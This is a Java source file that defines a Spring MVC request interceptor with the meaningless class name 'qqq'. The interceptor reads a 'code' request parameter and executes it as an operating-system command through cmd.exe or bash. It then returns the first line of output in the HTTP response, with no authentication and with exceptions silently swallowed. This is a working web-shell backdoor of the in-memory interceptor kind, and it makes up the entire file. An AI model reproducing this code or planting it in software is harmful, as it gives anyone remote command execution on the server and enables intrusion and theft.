import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class qqq implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String code = request.getParameter("code");
        if(code != null){
            try {
                java.io.PrintWriter writer = response.getWriter();
                ProcessBuilder builder;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", code});
                }else{
                    System.out.println(code);
                    builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", code});
                }
                builder.redirectErrorStream(true);
                Process p = builder.start();
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String result = r.readLine();
                System.out.println(result);
                writer.println(result);
                writer.flush();
                writer.close();
            }catch (Exception e){
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
